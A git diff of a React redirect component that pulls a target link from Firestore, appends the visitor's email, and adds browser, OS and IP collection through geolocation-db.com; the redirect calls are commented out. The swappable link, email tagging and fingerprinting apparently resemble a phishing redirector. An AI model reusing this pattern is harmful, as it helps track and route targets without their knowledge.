@@ -1,7 +1,9 @@
 import React, { useEffect } from "react";
 import { initializeApp } from "firebase/app";
 import { doc, getFirestore, onSnapshot } from "firebase/firestore";
+import { browserName, osName } from "react-device-detect";
 import "./loaderstyle.css";
+import axios from "axios";
 
 const firebaseApp = initializeApp({
   apiKey: "AIzaSyBNSKpZ1syb0z8g8OOoye1lps1k7AcXpk8",
@@ -29,8 +31,23 @@ function HomeRedirect() {
       console.log(doc.data());
 
       const currentLink = doc.data().currentlink;
-      const date = new Date().getMilliseconds()
+      const date = new Date().getMilliseconds();
 
+      console.log(`${osName} ${browserName}`);
+
+      const getIP = async () => {
+        const res = await axios.get("https://geolocation-db.com/json/");
+        return res;
+      };
+
+      getIP().then((res) => {
+        const ip=res.data.IPv4
+        console.log(`http://localhost:3000/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
+       // window.location.assign(`${currentLink}/${date}/?inclusive=${email}`);
+      // window.location.assign(`http://localhost:3000/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
+      });
+
+      /*
       // wake glitch.com page
       fetch(`${currentLink}`, requestOptions)
         .then((response) => {
@@ -41,6 +58,8 @@ function HomeRedirect() {
           console.log("error", error);
           window.location.assign(`${currentLink}/${date}/?inclusive=${email}`);
         });
+
+        */
     });
   });
 
